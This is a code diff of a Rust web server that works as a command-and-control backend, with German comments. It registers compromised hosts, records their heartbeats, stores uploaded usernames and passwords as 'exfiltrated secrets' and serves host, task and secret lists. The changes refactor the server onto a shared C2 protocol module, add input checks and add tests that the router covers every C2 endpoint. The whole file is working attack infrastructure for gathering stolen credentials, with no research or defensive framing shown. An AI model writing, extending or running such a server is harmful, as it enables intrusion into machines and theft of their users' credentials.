@@ -21,7 +21,11 @@ use axum::{
 };
 use axum_server::tls_rustls::RustlsConfig;
 use clap::Parser;
-use db::{Db, Host, Secret};
+use db::{Db, HostRow, SecretRow};
+use kx_core::c2::{
+    self, HeartbeatRequest, RegisterRequest, SecretUpload, PATH_HEARTBEAT, PATH_HOSTS,
+    PATH_REGISTER, PATH_SECRETS, PATH_TASKS,
+};
 use uuid::Uuid;
 
 /// Zeigt die API-Endpunkte an.
@@ -59,43 +63,23 @@ struct AppState {
     token: String,
 }
 
-/// Request: Host-Registrierung.
-#[derive(serde::Deserialize)]
-struct RegisterReq {
-    ip: String,
-    hostname: Option<String>,
-    os: Option<String>,
-    status: Option<String>,
-}
-
-/// Request: Heartbeat.
-#[derive(serde::Deserialize)]
-struct HeartbeatReq {
-    host_id: String,
-}
-
-/// Request: Secret-Upload.
-#[derive(serde::Deserialize)]
-struct SecretReq {
-    host_id: String,
-    cred_type: String,
-    username: String,
-    password: String,
-    source: Option<String>,
-}
-
-/// Registriert einen Host (id = IP für stabile Updates).
+/// Registriert einen Host. Die Host-ID kommt aus dem Request — der Server leitet
+/// sie nicht mehr aus der IP ab, sonst könnten Registrierung und Secret-Upload
+/// auseinanderlaufen.
 async fn register(
     State(st): State<AppState>,
-    Json(req): Json<RegisterReq>,
+    Json(req): Json<RegisterRequest>,
 ) -> impl IntoResponse {
+    if req.host_id.is_empty() {
+        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
+    }
     let now = kx_core::util::now_rfc3339();
-    let host = Host {
-        id: req.ip.clone(),
+    let host = HostRow {
+        id: req.host_id,
         ip: req.ip,
         hostname: req.hostname.unwrap_or_default(),
         os: req.os.unwrap_or_default(),
-        status: req.status.unwrap_or_else(|| "discovered".into()),
+        status: req.status.unwrap_or_else(|| c2::STATUS_DISCOVERED.into()),
         first_seen: now.clone(),
         last_seen: now,
     };
@@ -106,7 +90,10 @@ async fn register(
 }
 
 /// Aktualisiert das Last-Seen eines Hosts.
-async fn heartbeat(State(st): State<AppState>, Json(req): Json<HeartbeatReq>) -> impl IntoResponse {
+async fn heartbeat(
+    State(st): State<AppState>,
+    Json(req): Json<HeartbeatRequest>,
+) -> impl IntoResponse {
     let hosts = match st.db.list_hosts() {
         Ok(h) => h,
         Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
@@ -127,9 +114,12 @@ async fn heartbeat(State(st): State<AppState>, Json(req): Json<HeartbeatReq>) ->
 /// Speichert ein hochgeladenes Secret.
 async fn upload_secret(
     State(st): State<AppState>,
-    Json(req): Json<SecretReq>,
+    Json(req): Json<SecretUpload>,
 ) -> impl IntoResponse {
-    let secret = Secret {
+    if req.host_id.is_empty() {
+        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
+    }
+    let secret = SecretRow {
         id: Uuid::new_v4().to_string(),
         host_id: req.host_id,
         cred_type: req.cred_type,
@@ -147,7 +137,10 @@ async fn upload_secret(
 /// Liefert alle Hosts als JSON.
 async fn list_hosts(State(st): State<AppState>) -> impl IntoResponse {
     match st.db.list_hosts() {
-        Ok(h) => Json(h).into_response(),
+        Ok(rows) => {
+            let hosts: Vec<c2::Host> = rows.into_iter().map(c2::Host::from).collect();
+            Json(hosts).into_response()
+        }
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
@@ -155,7 +148,11 @@ async fn list_hosts(State(st): State<AppState>) -> impl IntoResponse {
 /// Liefert alle Secrets als JSON.
 async fn list_secrets(State(st): State<AppState>) -> impl IntoResponse {
     match st.db.list_secrets() {
-        Ok(s) => Json(s).into_response(),
+        Ok(rows) => {
+            let secrets: Vec<c2::ExfiltratedSecret> =
+                rows.into_iter().map(c2::ExfiltratedSecret::from).collect();
+            Json(secrets).into_response()
+        }
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
@@ -163,7 +160,10 @@ async fn list_secrets(State(st): State<AppState>) -> impl IntoResponse {
 /// Liefert alle Tasks als JSON.
 async fn list_tasks(State(st): State<AppState>) -> impl IntoResponse {
     match st.db.list_tasks() {
-        Ok(t) => Json(t).into_response(),
+        Ok(rows) => {
+            let tasks: Vec<c2::Task> = rows.into_iter().map(c2::Task::from).collect();
+            Json(tasks).into_response()
+        }
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
@@ -209,12 +209,12 @@ async fn main() {
 
     let app = Router::new()
         .route("/", get(dashboard))
-        .route("/api/register", post(register))
-        .route("/api/heartbeat", post(heartbeat))
-        .route("/api/secrets", post(upload_secret))
-        .route("/api/hosts", get(list_hosts))
-        .route("/api/secrets", get(list_secrets))
-        .route("/api/tasks", get(list_tasks))
+        .route(PATH_REGISTER, post(register))
+        .route(PATH_HEARTBEAT, post(heartbeat))
+        .route(PATH_SECRETS, post(upload_secret))
+        .route(PATH_HOSTS, get(list_hosts))
+        .route(PATH_SECRETS, get(list_secrets))
+        .route(PATH_TASKS, get(list_tasks))
         .with_state(state);
 
     let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
@@ -233,3 +233,52 @@ async fn main() {
         .await
         .expect("Server-Loop");
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Die Hilfetext-Auflistung nennt jeden Endpunkt, den der Router registriert.
+    /// Der Hilfetext ist die sechste Fundstelle des Vertrags — er muss mitlaufen.
+    #[test]
+    fn help_text_lists_every_contract_path() {
+        for path in [
+            PATH_REGISTER,
+            PATH_HEARTBEAT,
+            PATH_SECRETS,
+            PATH_HOSTS,
+            PATH_TASKS,
+        ] {
+            assert!(
+                HELP.contains(path),
+                "der Hilfetext nennt den Endpunkt {path} nicht"
+            );
+        }
+    }
+
+    /// Der Router registriert genau die Endpunkte des C2-Protokolls.
+    #[test]
+    fn router_registers_the_contract_paths() {
+        let app = Router::new()
+            .route("/", get(dashboard))
+            .route(PATH_REGISTER, post(register))
+            .route(PATH_HEARTBEAT, post(heartbeat))
+            .route(PATH_SECRETS, post(upload_secret))
+            .route(PATH_HOSTS, get(list_hosts))
+            .route(PATH_SECRETS, get(list_secrets))
+            .route(PATH_TASKS, get(list_tasks));
+        // Ohne State lässt sich der Router nicht in einen Request schicken —
+        // die Route-Pfade lassen sich aber über die Debug-Ausgabe prüfen.
+        let debug = format!("{app:?}");
+        for path in [
+            PATH_REGISTER,
+            PATH_HEARTBEAT,
+            PATH_SECRETS,
+            PATH_HOSTS,
+            PATH_TASKS,
+        ] {
+            assert!(debug.contains(path), "der Router registriert {path} nicht");
+        }
+    }
+}
+
